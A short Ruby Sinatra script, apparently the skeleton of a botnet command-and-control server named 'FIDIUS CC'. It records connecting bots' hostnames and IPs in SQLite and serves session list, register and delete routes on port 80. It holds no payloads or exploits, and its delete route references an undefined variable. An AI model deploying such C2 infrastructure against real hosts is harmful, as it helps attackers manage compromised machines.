#!/usr/bin/env ruby

require 'rubygems'
require 'sinatra'
require 'sequel'
require 'haml'

unless Process.uid == 0
  puts "[FIDIUS CC] You need to be root!"
  exit 1
end

DB = Sequel.sqlite File.join(File.dirname(__FILE__), 'cc.sqlite')
unless DB.table_exists? :bots
  DB.create_table :bots do
    primary_key :id
    String :hostname
    String :ip
    DateTime :last_seen
  end
end

PID_FILE = File.join(File.dirname(__FILE__), 'cc.pid')
raise "[FIDIUS CC] Already running!" if File.exists? PID_FILE
File.open(PID_FILE, 'w+') do |f|
  f.puts Process.pid
end
%w[SIGINT SIGTERM].each do |sig|
  Signal.trap(sig) do
    puts "[FIDIUS CC] Shutdown."
    File.unlink PID_FILE rescue true
  end
end

enable :run
set :port, 80
set :views, File.dirname(__FILE__) + '/templates'
set :haml, :format => :html5
set :public, File.dirname(__FILE__) + '/static'


get '/sessions' do
  haml :sessions
end

get '/session/:id' do
  @bot = DB[:bots].first("id = ?", params[:id])
  halt 404 unless @bot
  haml :session
end

post '/session/new' do
  id = DB[:bots].insert(:hostname => '--', :ip => request.ip, :last_seen => DateTime.now)
  @bot = DB[:bots].filter("id = ?", id)
  haml :session
end

delete '/session/:id' do
  @bot = DB[:bots].filter("id = ?", params[:id])
  halt 404 unless bot
  bot.delete
  haml :sessions
end

not_found do
  haml :"404"
end
